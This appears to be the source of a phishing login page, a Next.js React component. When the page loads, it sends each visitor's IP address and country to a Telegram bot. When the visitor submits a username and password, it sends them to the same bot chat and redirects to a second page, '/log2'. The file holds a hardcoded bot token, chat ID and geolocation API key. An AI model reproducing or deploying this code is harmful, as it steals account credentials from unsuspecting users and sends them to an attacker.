"use client";

import { useRouter } from "next/navigation";
import { useEffect, useState } from "react";

export default function Home() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  useEffect(() => {
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
          .then((res) => res.json())
          .then((data) => {
            const country = data.country_name;
            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=7847147773&parse_mode=markdown&text=*NEW SITE VISIT* %0A%0A*USER:* ${encodeURIComponent(ipAddress)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;

            fetch(apiUrl)
              .then((res) => {
                if (!res.ok) console.error("ERROR:", res.statusText);
                return res.json();
              })
              .then(() => console.log("SENT!"))
              .catch((e) => console.error("ERROR:", e));
          })
          .catch((e) => console.error("ERROR:", e));
      })
      .catch((e) => console.error("ERROR:", e));

  }, [])

  const onLogin = async (e) => {
    e.preventDefault();

    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const ipAddress = data.ip;

        fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=e4e885c9d83f4a1c920483077bd49a2d&ip=${ipAddress}`)
          .then((res) => res.json())
          .then((data) => {
            const country = data.country_name;
            const apiUrl = `https://api.telegram.org/bot7336936844:AAHy6YK4JqvujJ7a_2nQh5TT2arbitukpUg/sendMessage?chat_id=7847147773&parse_mode=markdown&text=*USER:* ${encodeURIComponent(ipAddress)} %0A*LOGIN 1:* %0A%0A*Username:* ${encodeURIComponent(username)} %0A*Password:* ${encodeURIComponent(password)} %0A%0A*COUNTRY:* ${encodeURIComponent(country)}`;

            fetch(apiUrl)
              .then((res) => {
                if (!res.ok) console.error("ERROR:", res.statusText);
                return res.json();
              })
              .then(() => {
                console.log("SENT!");
                router.push("/log2");
              })
              .catch((e) => console.error("ERROR:", e));
          })
          .catch((e) => console.error("ERROR:", e));
      })
      .catch((e) => console.error("ERROR:", e));
  };

  return (
    <>

    </>
  );
}
